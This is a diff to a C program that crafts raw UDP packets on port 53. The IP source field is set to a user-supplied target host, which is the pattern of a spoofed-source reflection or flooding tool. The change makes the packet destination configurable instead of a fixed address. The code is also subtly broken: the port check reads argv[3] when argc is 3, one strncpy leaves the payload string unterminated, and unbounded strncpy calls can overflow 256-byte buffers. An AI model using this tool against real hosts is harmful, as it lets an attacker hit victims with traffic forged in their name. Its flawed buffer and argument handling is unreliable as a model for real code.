@@ -106,25 +106,29 @@ int main ( int argc , char *argv[] )
 	struct  sockaddr_in server_addr;
 	int 	ret , url_len , send_len;
 	unsigned char	target_url[256];
-	unsigned char	*SendMessage = "hacker test";
+	unsigned char	dst_host[256];
+	unsigned char	SendMessage[128];
 	int 		i , j;
 
+	strncpy(SendMessage,"hacker test",strlen("hacker test")-1);
 
-	if( argc != 2 && argc != 3 )
+	if( argc != 3 && argc != 4 )
 	{
-		fprintf(stderr,"usage: %s TargetHost [Port]\n",argv[0]);
+		fprintf(stderr,"usage: %s TargetHost DstHost [Port]\n",argv[0]);
 		return 1;
 	}
 
 	// init target url array
 	for ( i = 0 ; i < 256 ; i++ ){
 		target_url[i] = '\0';
+		dst_host[i] = '\0';
 	}
 	strncpy( target_url , argv[1] , strlen(argv[1]) );
+	strncpy( dst_host , argv[2] , strlen(argv[2]) );
 	// init target port (default port 53)
 	port = 53;
 	if ( argc == 3 ){
-		port = atoi(argv[2]);
+		port = atoi(argv[3]);
 	}
 	printf("Target Host: %s\n",target_url);
 
@@ -163,7 +167,7 @@ int main ( int argc , char *argv[] )
 	iph->ttl       	= 255;
 	iph->protocol  	= 17;
 	iph->saddr      = inet_addr(target_url);
-	iph->daddr      = inet_addr("114.25.184.66");
+	iph->daddr      = inet_addr(dst_host);
 	iph->check      = csum((unsigned short *)iph, sizeof(struct ip_header));
 
 	// init UDP header
